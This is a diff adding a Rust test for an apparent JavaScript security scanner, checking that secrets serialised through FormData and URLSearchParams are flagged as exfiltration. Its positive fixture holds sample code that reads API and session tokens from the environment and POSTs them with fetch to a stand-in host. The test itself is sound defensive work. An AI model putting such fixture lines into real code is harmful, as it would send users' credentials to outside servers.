@@ -1074,6 +1074,49 @@ fn environment_secret_reaches_outbound_request() {
 }
 
 #[test]
+fn form_data_and_url_search_params_preserve_secret_labels() {
+    let root = temporary_directory("secret-serialization-containers");
+    fs::write(
+        root.join("positive.js"),
+        br#"const form = new FormData();
+form.append('token', process.env.API_TOKEN);
+fetch('https://example.invalid/form', { method: 'POST', body: form });
+const params = new URLSearchParams({ token: process.env.SESSION_TOKEN });
+fetch('https://example.invalid/query', { method: 'POST', body: params });"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("negative.js"),
+        br#"const form = new FormData();
+form.append('theme', 'dark');
+fetch('https://example.invalid/preferences', { method: 'POST', body: form });"#,
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let exfiltration = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
+        .collect::<Vec<_>>();
+    assert_eq!(exfiltration.len(), 2, "{}", report["findings"]);
+    assert!(
+        exfiltration
+            .iter()
+            .any(|finding| finding["evidence"].to_string().contains("FormData.append"))
+    );
+    assert!(
+        exfiltration
+            .iter()
+            .any(|finding| finding["evidence"].to_string().contains("URLSearchParams"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn imported_secret_reader_reaches_outbound_request_across_modules() {
     let root = temporary_directory("cross-module-secret-exfil");
     fs::write(
